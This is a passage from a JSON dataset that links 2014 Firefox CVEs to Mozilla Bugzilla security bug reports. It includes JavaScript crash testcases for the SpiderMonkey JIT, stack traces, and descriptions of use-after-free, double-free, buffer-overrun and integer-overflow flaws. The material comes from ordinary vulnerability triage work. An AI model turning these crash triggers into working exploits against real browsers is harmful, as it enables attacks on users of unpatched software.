{
  "year": 2014,
  "total": 127,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2014-1478": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=944278",
        "title": "OdinMonkey: Crash [@ js::Invoke]",
        "description": "x = function() {} m = [] x.toString = (function(a, foreign) { \"use asm\"; var ff = foreign.ff function f() { +ff() } return f })(this, { ff: function() { return RegExp(\"()\") } }) Object.defineProperty(m, 6, { value: x }) m.join() m.join() m.join() crashes 64-bit js debug and opt shell on m-c changeset 5eb1c89fc2bc with --ion-eager at js::Invoke. s-s because this is one of the rare Windows crashes (it didn't seem to reproduce on Mac), setting needinfo from Luke due to it seeming to involve asm.js. My configure flags are: AR=ar sh ./configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --enable-optimize --disable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --enable-methodjit --enable-type-inference --disable-tests --enable-more-deterministic --enable-threadsafe <other NSPR options>"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=924348",
        "title": "Intermittent PROCESS-CRASH | /tests/dom/indexedDB/test/test_add_put.html | application crashed [@ sqlite3LeaveMutexAndCloseZombie] or [@ hashDestroy]",
        "description": "Rev4 MacOSX Lion 10.7 fx-team opt test mochitest-3 on 2013-10-08 03:34:28 PDT for push 295575989d53 slave: talos-r4-lion-057 https://tbpl.mozilla.org/php/getParsedLog.php?id=28820726&tree=Fx-Team WARNING - PROCESS-CRASH | /tests/dom/indexedDB/test/test_add_put.html | application crashed [@ sqlite3LeaveMutexAndCloseZombie] 03:38:12 INFO - Crash dump filename: /var/folders/hk/v8w8k7ss2g1fjccmkfk0t1l400000w/T/tmpolKVBu/minidumps/6553A854-BC1C-43EC-A742-F6D75017B8B9.dmp 03:38:12 INFO - Operating system: Mac OS X 03:38:12 INFO - 10.7.2 11C74 03:38:12 INFO - CPU: amd64 03:38:12 INFO - family 6 model 23 stepping 10 03:38:12 INFO - 2 CPUs 03:38:12 INFO - Crash reason: EXC_BAD_ACCESS / 0x0000000d 03:38:12 INFO - Crash address: 0x0 03:38:12 INFO - Thread 41 (crashed) 03:38:12 INFO - 0 libnss3.dylib!sqlite3LeaveMutexAndCloseZombie [sqlite3.c : 116556 + 0x0] 03:38:12 INFO - rbx = 0x00000000ffffffff r12 = 0x0000000000000000 03:38:12 INFO - r13 = 0x0000000000000000 r14 = 0x000aa80000001500 03:38:12 INFO - r15 = 0x000000011d23fc00 rip = 0x0000000100522d04 03:38:12 INFO - rsp = 0x000000013ef6ab20 rbp = 0x000000013ef6ab50 03:38:12 INFO - Found by: given as instruction pointer in context 03:38:12 INFO - 1 libnss3.dylib!sqlite3Close [sqlite3.c : 116460 + 0x7] 03:38:12 INFO - rbx = 0x0000000000000000 r12 = 0x000000011f425630 03:38:12 INFO - r13 = 0x000000011d23fc00 r14 = 0x0000000000000002 03:38:12 INFO - r15 = 0x0000000000000048 rip = 0x000000010052e2c8 03:38:12 INFO - rsp = 0x000000013ef6ab60 rbp = 0x000000013ef6ab90 03:38:12 INFO - Found by: call frame info 03:38:12 INFO - 2 XUL!mozilla::storage::Connection::internalClose() [mozStorageConnection.cpp:295575989d53 : 834 + 0x8] 03:38:12 INFO - rbx = 0x0000000000000000 r12 = 0x000000011f425630 03:38:12 INFO - r13 = 0x0000000000000000 r14 = 0x000000011af5c270 03:38:12 INFO - r15 = 0x000000011f425600 rip = 0x0000000101e0fc66 03:38:12 INFO - rsp = 0x000000013ef6aba0 rbp = 0x000000013ef6abc0 03:38:12 INFO - Found by: call frame info 03:38:12 INFO - 3 XUL!mozilla::storage::Connection::Close() [mozStorageConnection.cpp:295575989d53 : 1068 + 0x7] 03:38:12 INFO - rbx = 0x0000000000000000 r12 = 0x000000011f425630 03:38:12 INFO - r13 = 0x0000000000000000 r14 = 0x000000011af5c270 03:38:12 INFO - r15 = 0x000000011f425600 rip = 0x0000000101e0e92b 03:38:12 INFO - rsp = 0x000000013ef6abd0 rbp = 0x000000013ef6abf0 03:38:12 INFO - Found by: call frame info 03:38:12 INFO - 4 XUL!mozilla::dom::indexedDB::CommitHelper::Run() [IDBTransaction.cpp:295575989d53 : 923 + 0x5] 03:38:12 INFO - rbx = 0x000000011f425620 r12 = 0x000000011f425630 03:38:12 INFO - r13 = 0x0000000000000000 r14 = 0x0000000000000003 03:38:12 INFO - r15 = 0x000000011f425600 rip = 0x0000000101a4604b 03:38:12 INFO - rsp = 0x000000013ef6ac00 rbp = 0x000000013ef6aca0 03:38:12 INFO - Found by: call frame info"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=916635",
        "title": "Recursive graph traversal in RangeAnalysis",
        "description": "RangeAnalysis::markBlocksInLoopBody uses recursion to visit all the basic blocks in a loop. Since there's no explicit limit on how many blocks a loop might contain, this could theoretically overflow the stack (though in practice, usually something else fails first)."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=944321",
        "title": "--ion-check-range-analysis failure with Float32Array (SIGTRAP)",
        "description": "toString = (function() { function f() { Float32Array()[6] = 33554433 } return f })() this + Object({ e: this % 1 }) causes a SIGTRAP in js opt shell on m-c changeset 77b5c6edfe96 with --ion-check-range-analysis --ion-eager --ion-gvn=off My configure flags are: CC=\"clang -Qunused-arguments\" AR=ar CXX=\"clang++ -Qunused-arguments\" sh ./configure --target=x86_64-apple-darwin12.5.0 --enable-optimize --disable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --enable-methodjit --enable-type-inference --disable-tests --enable-more-deterministic --with-ccache --enable-threadsafe <other NSPR options> autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: http://hg.mozilla.org/mozilla-central/rev/c78a87a9aa66 user: Nathan Froyd date: Tue Aug 27 16:32:44 2013 -0400 summary: Bug 909922 - don't pragma pack ipc message headers; r=bent but I think autoBisect is wrong here. Adding :sunfish as well, as this seems to involve --ion-check-range-analysis. s-s because SIGTRAPs can be bad."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=867597",
        "title": "IonMonkey: ARM hwcaps detection depends on uninitialised garbage on the stack",
        "description": "js/src/ion/arm/Architecture-arm.cpp:64 ibid has this #elif defined(WTF_OS_ANDROID) || defined(MOZ_B2G) FILE *fp = fopen(\"/proc/cpuinfo\", \"r\"); if (!fp) return false; char buf[1024]; fread(buf, sizeof(char), sizeof(buf), fp); fclose(fp); if (strstr(buf, \"vfp\")) flags |= HWCAP_VFP; if (strstr(buf, \"vfpv3\")) flags |= HWCAP_VFPv3; if (strstr(buf, \"vfpv3d16\")) flags |= HWCAP_VFPv3D16; if (strstr(buf, \"vfpv4\")) flags |= HWCAP_VFPv4; if (strstr(buf, \"idiva\")) flags |= HWCAP_IDIVA; if (strstr(buf, \"idivt\")) flags |= HWCAP_IDIVT; if (strstr(buf, \"neon\")) flags |= HWCAP_NEON; // not part of the HWCAP flag, but I need to know this, and we're not using // that bit, so... I'm using it if (strstr(buf, \"ARMv7\")) flags |= HWCAP_ARMv7; isSet = true; return flags; #endif viz. open /proc/cpuinfo, read arbitrary amount stuff into buf, not zero terminated, and then do strstr on the buf. Since in my test case, the file fits in buf (as one would expect), it winds up doing strstr on the garbage left over in buf[]. Hence (1) for the strings that don't appear /proc/cpuinfo (eg, vfpv4), the do/don't-we-have-this-feature result is random, and (2) if all of the garbage in buf[] doesn't contain a zero byte, we'll overrun the array."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=953373",
        "title": "Assertion failure: MIR instruction returned object with unexpected type, at js/src/jit/IonMacroAssembler.cpp:1223, loading Amazon product page",
        "description": "Loading http://www.amazon.com/gp/product/0415368197/ref=as_li_tf_tl?ie=UTF8&camp=1789&cr eative=9325&creativeASIN=0415368197&linkCode=as2&tag=matthygles-20 reliably yields a crash: Assertion failure: MIR instruction returned object with unexpected type, at js/src/jit/IonMacroAssembler.cpp:1223 I can't get gdb to give me a useful stack, nor does this assertion trigger the usual handler that prints a stack trace (which is odd). I'm using a local debug build built with my local changes on top of https://hg.mozilla.org/mozilla-central/rev/451f47a70238"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=932162",
        "title": "Crash in mozilla::dom::indexedDB::IndexedDatabaseManager::AddRef invoked by mozilla::dom::indexedDB::FileInfo::Cleanup in cycle collecting DOM Worker death",
        "description": "In Gaia e-mail we are doing exciting things with message sending where we build composite Blobs on a DOMWorker made out of some Strings and/or TypedArrays plus some Blobs we stashed in IndexedDB (and then postMessaged across to the worker). I am able to reliably reproduce the following crash in our gaia e-mail backend tests which are being run under a linux x64 b2g-desktop build. Because I am already trying to work around bug 932143 I know with high probability that the worker is dying because of a self.close() call and that the main page that owns it is probably still alive. (Because if this wasn't what is happening, we would be crashing due to that bug.) There's a pretty good chance the main thread JS code has already discarded its references to the IndexedDB Blobs, called close on the IndexedDB instance and forgotten about the IndexedDB instance too. (The unit tests attempt a clean shutdown of our use of the database.) I have no idea if a GC would have already happened on the main thread. (In fact, the main thread holds very few references to the Blobs or the IndexedDB instance, all of the worker happens on the worker and we're just remoting calls to the main thread because we have to.) Please feel free to ask me to run with any logging/DEBUG builds that would help, or if you'd like me to trace any code for suspiciousness. This is probably going to block a koi+ blocker unless you think this can only happen on DOMWorker shutdown, in which case it's just an annoyance. I'm not going to investigate anything right now since it sounded from khuey like this might be fairly clear cut. #0 0x00002aaaacff32d6 in mozilla::dom::indexedDB::IndexedDatabaseManager::AddRef (this=this@entry=0x2aaad1dab5e0) at /home/visbrero/rev_control/fgit/mozilla-central/dom/indexedDB/IndexedDatabaseManager.cpp:726 #1 0x00002aaaacfd6e8a in nsRefPtr (aRawPtr=0x2aaad1dab5e0, this=<synthetic pointer>) at ../../dist/include/nsAutoPtr.h:911 #2 mozilla::dom::indexedDB::FileInfo::Cleanup (this=this@entry=0x2aaadb147df0) at /home/visbrero/rev_control/fgit/mozilla-central/dom/indexedDB/FileInfo.cpp:107 #3 0x00002aaaacfd6f76 in mozilla::dom::indexedDB::FileInfo::UpdateReferences (this=0x2aaadb147df0, aRefCount=..., aDelta=-1, aClear=<optimized out>) at /home/visbrero/rev_control/fgit/mozilla-central/dom/indexedDB/FileInfo.cpp:92 #4 0x00002aaaacd545b8 in ~nsRefPtr (this=0x2aaad7e60d90, __in_chrg=<optimized out>) at ../../../dist/include/nsAutoPtr.h:887 #5 Destruct (e=0x2aaad7e60d90) at ../../../dist/include/nsTArray.h:534 #6 DestructRange (count=4, start=0, this=0x2aaadaf3fee8) at ../../../dist/include/nsTArray.h:1573 #7 RemoveElementsAt (count=4, start=0, this=0x2aaadaf3fee8) at ../../../dist/include/nsTArray.h:1290 #8 Clear (this=0x2aaadaf3fee8) at ../../../dist/include/nsTArray.h:1301 #9 ~nsTArray_Impl (this=0x2aaadaf3fee8, __in_chrg=<optimized out>) at ../../../dist/include/nsTArray.h:752 #10 ~nsTArray (this=0x2aaadaf3fee8, __in_chrg=<optimized out>) at ../../../dist/include/nsTArray.h:1646 #11 nsDOMFileBase::~nsDOMFileBase (this=0x2aaadaf3fe80, __in_chrg=<optimized out>) at ../../../dist/include/nsDOMFile.h:121 #12 0x00002aaaacd546a3 in nsDOMMultipartFile::~nsDOMMultipartFile (this=0x2aaadaf3fe80, __in_chrg=<optimized out>) at /home/visbrero/rev_control/fgit/mozilla-central/content/base/src/nsDOMBlobBuilder.h:23 #13 0x00002aaaacd55fd2 in nsDOMFile::Release (this=0x2aaadaf3fe80) at /home/visbrero/rev_control/fgit/mozilla-central/content/base/src/nsDOMFile.cpp:461 #14 0x00002aaaadd93c9f in finalize (fop=0x2aaad8901900, this=0x2aaaddaa42b0) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsobjinlines.h:89 #15 finalize<JSObject> (thingSize=48, thingKind=js::gc::FINALIZE_OBJECT2, fop=0x2aaad8901900, this=0x2aaaddaa4000) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:337 #16 FinalizeTypedArenas<JSObject> (dest=..., budget=..., thingKind=js::gc::FINALIZE_OBJECT2, src=0x2aaad89018a8, fop=0x2aaad8901900) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:401 #17 FinalizeArenas (fop=fop@entry=0x2aaad8901900, src=src@entry=0x2aaad89018a8, dest=..., thingKind=thingKind@entry=js::gc::FINALIZE_OBJECT2, budget=...) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:438 #18 0x00002aaaadd949f8 in finalizeNow (thingKind=js::gc::FINALIZE_OBJECT2, fop=0x2aaad8901900, this=0x2aaad80e7838) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:1340 #19 js::gc::ArenaLists::queueObjectsForSweep (this=this@entry=0x2aaad80e7838, fop=fop@entry=0x2aaad8901900) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:1436 #20 0x00002aaaadd94fd2 in BeginSweepingZoneGroup (rt=rt@entry=0x2aaad7cec000) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:3767 #21 0x00002aaaadd97ab1 in BeginSweepPhase (lastGC=true, rt=0x2aaad7cec000) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:3851 #22 IncrementalCollectSlice (rt=rt@entry=0x2aaad7cec000, budget=budget@entry=0, reason=reason@entry=JS::gcreason::DESTROY_RUNTIME, gckind=gckind@entry=js::GC_NORMAL) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:4410 #23 0x00002aaaadd98c68 in GCCycle (rt=rt@entry=0x2aaad7cec000, incremental=incremental@entry=false, budget=budget@entry=0, gckind=gckind@entry=js::GC_NORMAL, reason=reason@entry=JS::gcreason::DESTROY_RUNTIME) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:4555 #24 0x00002aaaadd990f5 in Collect (rt=rt@entry=0x2aaad7cec000, incremental=incremental@entry=false, budget=budget@entry=0, gckind=gckind@entry=js::GC_NORMAL, reason=reason@entry=JS::gcreason::DESTROY_RUNTIME) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:4699 #25 0x00002aaaadd9939d in Collect (reason=JS::gcreason::DESTROY_RUNTIME, gckind=js::GC_NORMAL, budget=0, incremental=false, rt=rt@entry=0x2aaad7cec000) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:4725 #26 js::GC (rt=rt@entry=0x2aaad7cec108, gckind=gckind@entry=js::GC_NORMAL, reason=reason@entry=JS::gcreason::DESTROY_RUNTIME) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsgc.cpp:4724 #27 0x00002aaaade8ec7b in JSRuntime::~JSRuntime (this=0x2aaad7cec108, __in_chrg=<optimized out>) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/vm/Runtime.cpp:443 #28 0x00002aaaadd391ce in js_delete<JSRuntime> (p=0x2aaad7cec000) at ../../dist/include/js/Utility.h:319 #29 JS_DestroyRuntime (rt=0x2aaad7cec000) at /home/visbrero/rev_control/fgit/mozilla-central/js/src/jsapi.cpp:743 #30 0x00002aaaad73811e in mozilla::CycleCollectedJSRuntime::DestroyRuntime (this=this@entry=0x2aaad8901ca0) at /home/visbrero/rev_control/fgit/mozilla-central/xpcom/base/CycleCollectedJSRuntime.cpp:472 #31 0x00002aaaad738aef in mozilla::CycleCollectedJSRuntime::~CycleCollectedJSRuntime (this=0x2aaad8901ca0, __in_chrg=<optimized out>) at /home/visbrero/rev_control/fgit/mozilla-central/xpcom/base/CycleCollectedJSRuntime.cpp:480 #32 0x00002aaaacfbc49b in (anonymous namespace)::WorkerThreadRunnable::Run (this=<optimized out>) at /home/visbrero/rev_control/fgit/mozilla-central/dom/workers/RuntimeService.cpp:946 #33 0x00002aaaad7346f0 in nsThread::ProcessNextEvent (this=0x2aaad7bc9ce0, mayWait=<optimized out>, result=0x2aaad8901e2f) at /home/visbrero/rev_control/fgit/mozilla-central/xpcom/threads/nsThread.cpp:622 #34 0x00002aaaad7064bf in NS_ProcessNextEvent (thread=<optimized out>, thread@entry=0x2aaad7bc9ce0, mayWait=mayWait@entry=true) at /home/visbrero/rev_control/fgit/mozilla-central/xpcom/glue/nsThreadUtils.cpp:251 #35 0x00002aaaad734d99 in nsThread::ThreadFunc (arg=0x2aaad7bc9ce0) at /home/visbrero/rev_control/fgit/mozilla-central/xpcom/threads/nsThread.cpp:250 #36 0x00002aaaabf92cc2 in _pt_root (arg=0x2aaabee55020) at /home/visbrero/rev_control/fgit/mozilla-central/nsprpub/pr/src/pthreads/ptthread.c:204 #37 0x00002aaaaacd7f6e in start_thread (arg=0x2aaad8902700) at pthread_create.c:311 #38 0x00002aaaab7f39cd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:113"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=950452",
        "title": "Assertion failure: MIR instruction returned value with unexpected type, at jit/IonMacroAssembler.cpp:1219",
        "description": "The following testcase asserts on mozilla-central revision c049cb230d77 (run with --fuzzing-safe --ion-eager): var ff = new f(\"foo\") function f(y) { y = +y; };"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=911845",
        "title": "Beta node checking, found bugs",
        "description": "I extended --ion-check-range-analysis to include checking for Beta nodes. This turned up some cases where range analysis wasn't setting the max_exponent_ field properly. I have not yet done any analysis to determine whether the bugs found are actually security-relevant, but since the bugs are in range analysis code, and they're present in various branches, I'm filing it as a protected bug to be on the safe side."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=922603",
        "title": "Signed integer overflow in image/src/imgFrame.cpp",
        "description": "The following part of our codebase show signed integer overflows at runtime (when running our tests, based on mozilla-inbound 8bf84234319a): # Format is: Location, Error, Test that triggered it (each in a single line) image/src/imgFrame.cpp:58 runtime error: signed integer overflow: 65535 * 65535 cannot be represented in type 'int' file:///builds/slave/test/build/tests/reftest/tests/image/test/crashtests/invalid-size.gif Signed integer overflows are undefined behavior according to the C/C++ standard and discouraged by the CERT Secure Coding Standard. Even if the overflow itself is intended/checked (which should also be verified), we should not rely on the result, nor on any checks performed with the result after the computation. In the optimization stage, the compiler may assume overflow is not happening and produce wrong results as well as eliminate further checks, recognized as dead code. For further information, see the tracking bug. Marked as security sensitive until investigated because this overflow is indeed checked afterwards: > // check to make sure we don't overflow a 32-bit > int32_t tmp = aWidth * aHeight; > if (MOZ_UNLIKELY(tmp / aHeight != aWidth)) { > NS_WARNING(\"width or height too large\"); > return false; > } As the if branch is only hit in the overflow case, an optimizing compiler could completely remove it, assuming that overflow does not happen. Putting needinfo on ehsan according to hg blame for that particular code. If you're not the right person to take a look, could you please suggest someone? :) Thanks!"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=945585",
        "title": "Crash involving nsNodeUtils::LastRelease(), possibly due to running it twice",
        "description": "A user reported frequent crashes. He provided a test case which he requested not be made public, but I can email anyone the details. I've given them to bz. Stack at crash time: #0 0x000000000040fdee in jemalloc_crash () at ../../../memory/mozjemalloc/jemalloc.c:1592 #1 0x000000000040e916 in arena_dalloc_small (chunk=<optimised out>, arena=<optimised out>, ptr=<optimised out>, mapelm=<optimised out>) at ../../../memory/mozjemalloc/jemalloc.c:4610 #2 arena_dalloc (ptr=<optimised out>, offset=<optimised out>) at ../../../memory/mozjemalloc/jemalloc.c:4678 #3 0x00007ffff2f99b19 in nsNodeUtils::LastRelease (aNode=0x7fffbe407000) at ../../../../content/base/src/nsNodeUtils.cpp:193 #4 0x00007ffff2f55cc4 in nsDocument::Release (this=0x7fffbe407000) at ../../../../content/base/src/nsDocument.cpp:1621 #5 0x00007ffff317a024 in ~nsCOMPtr_base (this=<optimised out>) at ../../../../dist/include/nsCOMPtr.h:430 #6 ~nsCOMPtr (this=<optimised out>) at ../../../../dist/include/nsCOMPtr.h:469 #7 ~nsRefPtr (this=<optimised out>, this=<optimised out>, this=<optimised out>, this=<optimised out>, this=<optimised out>) at ../../../../dist/include/nsCOMPtr.h:469 #8 TX_CompileStylesheet (aNode=<optimised out>, aProcessor=<optimised out>, aCallerPrincipal=0x0, aStylesheet=0x7fffbe6944f0) at ../../../../../content/xslt/src/xslt/txMozillaStylesheetCompiler.cpp:744 #9 0x00007ffff317f2bf in txMozillaXSLTProcessor::NodeWillBeDestroyed ( this=0x7fffbe6944c0, aNode=0x100000) at ../../../../../content/xslt/src/xslt/txMozillaXSLTProcessor.cpp:1199 #10 0x00007ffff2f99aee in nsNodeUtils::LastRelease (aNode=0x7fffbe407000) at ../../../../content/base/src/nsNodeUtils.cpp:188 #11 0x00007ffff2f55cc4 in nsDocument::Release (this=0x7fffbe407000) at ../../../../content/base/src/nsDocument.cpp:1621 #12 0x00007ffff3b82775 in ReleaseSliceNow (aSlice=<optimised out>, aData=0x7fffbe2a4798) at ../../../xpcom/base/CycleCollectedJSRuntime.cpp:1064 #13 0x00007ffff3b82a06 in mozilla::IncrementalFinalizeRunnable::ReleaseNow ( this=0x7fffbe2a4780, aLimited=true) at ../../../xpcom/base/CycleCollectedJSRuntime.cpp:1126 #14 0x00007ffff3b82b1f in mozilla::IncrementalFinalizeRunnable::Run ( this=0x7fffbe2a4780) at ../../../xpcom/base/CycleCollectedJSRuntime.cpp:1159 #15 0x00007ffff3b7e8ec in nsThread::ProcessNextEvent (this=0x7ffff6c27f20, mayWait=<optimised out>, result=0x7fffffff6dc0) at ../../../xpcom/threads/nsThread.cpp:622 #16 0x00007ffff3b4b0e8 in NS_ProcessNextEvent (thread=<optimised out>, mayWait=true) at ../../../xpcom/glue/nsThreadUtils.cpp:238 #17 0x00007ffff2fc142b in nsXMLHttpRequest::Send (this=0x7fffc405ac00, aVariant=<optimised out>, aBody=...) at ../../../../content/base/src/nsXMLHttpRequest.cpp:2915 #18 0x00007ffff3a855f7 in Nullable (aBody=..., this=<optimised out>, this=<optimised out>, this=<optimised out>, aValue=...) at ../../../content/base/src/nsXMLHttpRequest.h:350 #19 Send (this=<optimised out>, rv=<optimised out>, this=<optimised out>, aBody=...) at ../../../content/base/src/nsXMLHttpRequest.h:354 jemalloc is asserting; it looks like a double-free or use-after-free."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=944851",
        "title": "Array out-of-bounds [@ mozilla::dom::AudioParamTimeline::AudioNodeInputValue]",
        "description": "Assertion failure: i < Length() (invalid array index), at nsTArray.h:887"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=942152",
        "title": "Assertion failure: ss->ssl3.hs.hashType == handshake_hash_unknown",
        "description": "Loading https://avukat.uyap.gov.tr/portal_baslangic.uyap with a debug build tested on win7 crashes on load with Assertion failure: ss->ssl3.hs.hashType == handshake_hash_unknown will try to get a testcase etc for this - also according to bughunter it also crashes nightly and aurora builds"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=938431",
        "title": "Assertion failure: consumer->isConsistentFloat32Use(), at jit/IonAnalysis.cpp",
        "description": "function x() {} ParallelArray(3385, function(y) { Object.defineProperty([], 8, { e: (y ? x : Math.fround(1)) }) }) asserts js debug shell on m-c changeset 7b014f0f3b03 with --baseline-eager at Assertion failure: consumer->isConsistentFloat32Use(), at jit/IonAnalysis.cpp My configure flags are: CC=\"clang -Qunused-arguments\" AR=ar CXX=\"clang++ -Qunused-arguments\" sh ./configure --target=x86_64-apple-darwin12.5.0 --enable-optimize --enable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --enable-methodjit --enable-type-inference --disable-tests --with-ccache --disable-threadsafe autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: http://hg.mozilla.org/mozilla-central/rev/13568a3576cd user: Benjamin Bouvier date: Thu Sep 12 14:54:01 2013 -0700 summary: Bug 915301: Check Float32 coherency; r=sstangl"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=946733",
        "title": "Crash in nr_turn_stun_ctx_cb",
        "description": "So, I was doing the following thing, while using https://opentokrtc.com/, in the Paris office: - A Linux machine, using a wired connection, running Chromium 30.0.1599.114 and today's Firefox Nightly. One tab in Firefox, two tabs in Chrome, all in the same room. - A macbook, running a build from yesterday of Chromium, connected to the \"Mozilla\" wifi network, also in the same room. All the browsers were connected to a room (four participants). After reloading multiple times the Chrome tabs, I tried to reload the Firefox tab, and after a couple seconds trying to connect, it crashed. The bug report with stacks: https://crash-stats.mozilla.com/report/index/920a4655-1911-4b63-b005-d9f582131205"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=911707",
        "title": "Assertion failure: arr->lengthIsWritable() (setter shouldn't be called if property is non-writable), at jsarray.cpp",
        "description": "try { x = []; y = []; f = (function() { y.length = 6 }); Object.freeze(y); f(); Object.prototype.watch.call(x, \"length\", (function() { return function() { f() } })()); Array.prototype.pop.call(x) } catch (e) {} Array.prototype.push.call(x, \"\") asserts js debug threadsafe shell on m-c changeset 1179318fb5aa with --ion-eager --ion-inlining=off at Assertion failure: arr->lengthIsWritable() (setter shouldn't be called if property is non-writable), at jsarray.cpp My configure flags are: LD=ld CROSS_COMPILE=1 CXX=\"clang++ -Qunused-arguments -arch i386\" RANLIB=ranlib CC=\"clang -Qunused-arguments -arch i386\" AS=$CC AR=ar STRIP=\"strip -x -S\" HOST_CC=\"clang -Qunused-arguments\" HOST_CXX=\"clang++ -Qunused-arguments\" sh ./configure --target=i386-apple-darwin9.2.0 --enable-macos-target=10.5 --enable-optimize --enable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --enable-methodjit --enable-type-inference --disable-tests --enable-threadsafe --with-ccache <some NSPR compile flags, or use --with-system-nspr> autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: http://hg.mozilla.org/mozilla-central/rev/c1ccfd8f31bf user: Eric Faust date: Fri Aug 30 18:50:36 2013 -0700 summary: Bug 824393 - Part 0: Open SetPropertyIC to cases with uncertain TI. (r=bhackett) (s-s because the stack is short and strange) Eric, is bug 824393 probably related?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=942940",
        "title": "Potential dangling peerreflexive candidate on some types of failure.",
        "description": "When a new peer reflexive candidate is created, it is inserted into the candidate list prior to creation of the required candidate pair. http://dxr.mozilla.org/mozilla-central/source/media/mtransport/third_party/nICEr/src/ice/ice_component.c#523 If some failure is encountered while creating the pair, the code at the abort: label destroys the already inserted candidate, leaving us open for use after free, and guaranteeing a double free. http://dxr.mozilla.org/mozilla-central/source/media/mtransport/third_party/nICEr/src/ice/ice_component.c#587"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=939472",
        "title": "\"Assertion failure: view\" with gcslice and neuter",
        "description": "var a = new Uint8Array(); a.subarray(); gcslice(0); gcslice(1781); neuter(a.buffer); Assertion failure: view, at js/src/vm/TypedArrayObject.cpp:824 Using the trick in bug 929786 comment 4, the first bad revision is: changeset: http://hg.mozilla.org/mozilla-central/rev/0efef923cc17 user: Steve Fink date: Tue Oct 15 23:48:01 2013 -0700 summary: Bug 861925 - Allow grabbing data from ArrayBuffers and neutering them independently (in addition to Steal, which does both at the same time). r=Waldo"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=925308",
        "title": "Assertion failure: *(int*)size_ >= 0, at vm/SPSProfiler.cpp:196",
        "description": "The following testcase asserts on mozilla-central revision aa986b6ce882 (run with --fuzzing-safe --ion-eager): var lfcode = new Array(); lfcode.push(\"3\"); lfcode.push(\"enableSPSProfilingAssertions(false);foo();\"); while (true) { var file = lfcode.shift(); if (file == undefined) { break; } loadFile(file) } function loadFile(lfVarx) { if (lfVarx.substr(-3) != \".js\" && lfVarx.length != 1) { switch (lfRunTypeId) { default: function newFunc(x) { new Function(x)(); }; newFunc(lfVarx); break; } } else if (!isNaN(lfVarx)) { lfRunTypeId = parseInt(lfVarx); } }"
      }
    ],
    "CVE-2014-1482": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=943803",
        "title": "Image decoding causing FireFox to crash with Goo Create",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36 Steps to reproduce: This is a bug discovered in Goo Create, the issue reported on our bugtracking system is located here : http://goo.myjetbrains.com/youtrack/issue/create-221 Crash reports reported related to this: bp-dd9e5c6b-c6f7-46d8-afca-0847d2131121 2013-11-21 13:17 bp-b4364feb-e53b-4a1d-9444-cb0e22131121 2013-11-21 13:10 bp-3510a383-ad61-4290-821c-97ff32131121 2013-11-21 13:06 bp-98816ed0-8987-4915-92cf-257222131121 2013-11-21 13:01 bp-24d61e5d-e863-4fe4-b844-21f2d2131121 2013-11-21 13:00 bp-36f83bc5-a4ea-4e82-b392-00f5f2131121 2013-11-21 12:58 bp-2a8e1482-726a-458c-b538-6a5ed2131121 2013-11-21 12:56 bp-b1d3fe71-ef60-4942-898a-03ff02131121 2013-11-21 12:55 bp-fc8435e9-34f9-4ee2-b0ab-42f562131121 2013-11-21 12:47 bp-99e4ad95-8375-41c5-aca3-642d02131121 2013-11-21 11:20 bp-cb9351ba-c090-4d26-9e8b-55c0b2131121 2013-11-21 11:16 Computer specs : Win 7 Home Premium 64bit , SP1 Intel i5-3450 8GB RAM NVIDIA GeForce GTX 660 1. Go to Goo Create create.gootechnologies.com, login with an account you have been provided with. The accounts can be used simultaneously , but do create new projects to avoid possible conflicts. 2. Create a new project by clicking on the \"create new project\" button on the bottom right of the \"manage projects\" dialog which is popped up upon logging in. 3. Click on the red asset library button in the bottom right, and click on the zombie or goon to add either of them to the scene. (A model with textures is needed) 4. Using the menu bar on the left side of the screen, find and click the material button to open up the material panel. (shiny sphere icon in the middle) 